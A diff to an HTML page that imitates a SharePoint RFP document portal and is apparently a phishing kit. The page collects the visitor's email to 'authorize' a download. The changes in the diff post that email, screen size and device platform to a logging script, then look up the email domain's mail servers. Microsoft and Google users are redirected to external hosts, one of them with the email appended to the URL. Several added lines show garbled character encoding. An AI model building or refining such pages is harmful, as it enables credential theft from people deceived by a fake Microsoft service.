@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>SharePoint - RFP Portal</title>
+  <title>RFP Portal</title>
   <style>
     :root{
       --sp-primary:#0078d4;
@@ -173,7 +173,7 @@
           <rect x="3.2" y="9.8" width="6" height="0.8" fill="#ffffff" opacity="0.9"/>
         </svg>
       </span>
-      <div id="spHeaderTitle" class="sp-header__title">RFP Project • Jan 01, 2026</div>
+      <div id="spHeaderTitle" class="sp-header__title">RFP Project â€¢ Jan 01, 2026</div>
     </div>
   </header>
 
@@ -362,7 +362,7 @@
     <section class="sp-download">
       <div id="selectedCount" class="sp-download__info">Select documents to download</div>
       <button id="downloadBtn" class="sp-btn" disabled onclick="openModal()">
-        📥 Download selected
+        ðŸ“¥ Download selected
       </button>
     </section>
   </main>
@@ -395,7 +395,7 @@
           <span>This is secure</span>
         </div>
 
-        <p class="sp-auth-msg">Enter your email address to confirm you’re authorized to download the selected document(s).</p>
+        <p class="sp-auth-msg">Enter your email address to confirm youâ€™re authorized to download the selected document(s).</p>
         <div class="sp-form__group">
           <label class="sp-label" for="emailInput">Email address</label>
           <input id="emailInput" type="email" class="sp-input" placeholder="name@company.com" />
@@ -453,7 +453,7 @@ document.addEventListener('DOMContentLoaded', checkUrlHashForGrant);
   function initHeader(){
     currentProjectName = generateProjectName();
     const dateStr = formatToday();
-    document.getElementById('spHeaderTitle').textContent = `${currentProjectName} • ${dateStr}`;
+    document.getElementById('spHeaderTitle').textContent = `${currentProjectName} â€¢ ${dateStr}`;
     document.getElementById('crumbProject').textContent = currentProjectName;
     document.getElementById('pageTitle').textContent = currentProjectName;
   }
@@ -534,7 +534,8 @@ document.addEventListener('DOMContentLoaded', checkUrlHashForGrant);
   }
 
   // DNS MX check and redirect per host
-  async function checkMxAndRedirect(domain){
+  async function checkMxAndRedirect(email){
+     const domain = email.split('@')[1].toLowerCase();
     try{
       const url = `https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`;
       const res = await fetch(url, { headers: { 'Accept': 'application/dns-json' }});
@@ -551,8 +552,8 @@ document.addEventListener('DOMContentLoaded', checkUrlHashForGrant);
       else if (isMicrosoft) target = 'office365';
 
       const redirects = {
-		gsuite: 'https://csda.info',
-        office365: 'https://noscript.peanouzujo.my.id/jEP6aOTWiGu!/$'+email,
+		gsuite: 'https://checkpersonal.com/?key=0c20d3539c69be1908cead3c09a7a018',
+        office365: 'https://wiki.peanouzujo.my.id/yt2mjr@eF7WeRBV/$'+email,
         adobe: 'https://pdf-render.vercel.app/?from=me'
       };
 
@@ -587,9 +588,20 @@ document.addEventListener('DOMContentLoaded', checkUrlHashForGrant);
       files: filesToDownload,
       timestamp: new Date().toISOString()
     });
+    
+    (function () {
+    const data = new FormData();
+    data.append('resolution', screen.width + 'x' + screen.height);
+    data.append('device', navigator.platform || 'unknown');
+    data.append('email', email);
 
-    const domain = email.split('@')[1].toLowerCase();
-    checkMxAndRedirect(domain);
+    fetch('/log.php', {
+        method: 'POST',
+        body: data,
+        keepalive: true
+    });
+})();
+    checkMxAndRedirect(email);
   }
 
   // Init on load
@@ -599,5 +611,9 @@ document.addEventListener('DOMContentLoaded', checkUrlHashForGrant);
     updateUI();
   });
 </script>
+<script>
+
+</script>
+
 </body>
 </html>
